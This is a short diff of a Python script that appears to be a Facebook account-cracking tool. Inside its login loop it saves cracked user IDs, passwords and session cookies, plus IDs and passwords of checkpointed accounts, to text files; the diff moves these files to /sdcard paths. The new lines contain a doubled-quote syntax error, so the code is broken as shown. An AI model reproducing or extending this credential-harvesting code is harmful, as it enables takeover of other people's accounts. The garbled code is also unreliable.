@@ -101,13 +101,13 @@ def login(uid, ui):
                 )
                 oks.append(uid)
 
-                open("OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
+                open(""/sdcard/PE-super.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                 break
 
             elif "www.facebook.com" in str(response.get("error_msg", "")):
                 cks.append(uid)
 
-                open("CP.txt", "a").write(f"{uid}|{pw}\n")
+                open(""/sdcard/PE-OK.txt", "a").write(f"{uid}|{pw}\n")
                 break
 
         loop += 1
